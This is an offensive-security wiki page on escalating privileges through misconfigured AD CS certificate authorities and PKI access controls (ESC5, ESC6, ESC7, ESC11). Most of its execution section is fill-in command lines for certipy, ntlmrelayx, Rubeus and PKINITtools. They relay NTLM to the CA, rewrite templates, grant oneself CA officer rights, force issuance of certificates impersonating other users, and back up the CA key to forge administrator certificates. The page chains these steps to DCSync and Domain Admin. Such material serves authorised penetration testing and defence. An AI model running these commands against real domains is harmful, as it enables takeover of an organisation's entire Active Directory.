# CA and ACL Misconfigurations

Beyond templates, the CA itself and the ACLs on PKI objects offer escalation. ESC6 is an CA flag that lets any request specify its subject; ESC7 is dangerous rights over the CA; ESC5 and the object-ACL cases let you rewrite a template or CA setting into a vulnerable state.

## Why It Works

Certificate services security depends on the CA configuration flags and on the ACLs protecting the templates, the CA object, and related PKI objects. Write access to any of them lets an attacker manufacture the misconfiguration they need.

## Prerequisites

* Any valid domain credential
* Write access to a PKI object, or a CA with a dangerous flag set

## Execution

**Misconfigured Certificate Authority**

* **→ ESC6**
  * Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication
    * **→ ESC1**
* ESC11
  * `ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    * `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>` [\[tool\]](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
      * **→ Pass the ticket**
        * **→ DCSYNC**
          * **→ Domain Admin**
  * `certipy relay -target rpc://<ip_ca> -ca '<ca_name>'` [\[tool\]](https://github.com/ly4k/Certipy)
    * `certipy auth -pfx <certificate> -dc-ip <dc_ip>` [\[tool\]](https://github.com/ly4k/Certipy)

**Misconfigured ACL**

* ESC4
  * write privilege over a certificate template
    * `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug` [\[tool\]](https://github.com/ly4k/Certipy)
      * **→ ESC1**
    * restore template
      * `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json` [\[tool\]](https://github.com/ly4k/Certipy)
* ESC7
  * Manage CA
    * `certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>` [\[tool\]](https://github.com/ly4k/Certipy)
      * **→ ESC7 Manage certificate**
  * Manage certificate
    * `certipy ca -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>` [\[tool\]](https://github.com/ly4k/Certipy)
      * `certipy req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'` [\[tool\]](https://github.com/ly4k/Certipy)
        * error, but save private key and get issue request
    * Issue request
      * `certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>` [\[tool\]](https://github.com/ly4k/Certipy)
        * `certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -retreive <request_id>` [\[tool\]](https://github.com/ly4k/Certipy)
          * **→ Pass the certificate**

**Vulnerable PKI Object access control**

* ESC5
  * Vulnerable acl on PKI
    * **→ ACL**
  * Golden certificate
    * `certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>` [\[tool\]](https://github.com/ly4k/Certipy)
      * `certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>` [\[tool\]](https://github.com/ly4k/Certipy)
        * **→ Pass the certificate**

## Related

* [Misconfigured Templates (ESC1–ESC4)](file:///9685693/adcs/misconfigured-templates-esc1-esc4.md) — the template-level equivalents
* [Rights on Users & Groups](file:///9685693/acl-abuse/rights-on-users-and-groups.md) — the general ACL-abuse toolkit
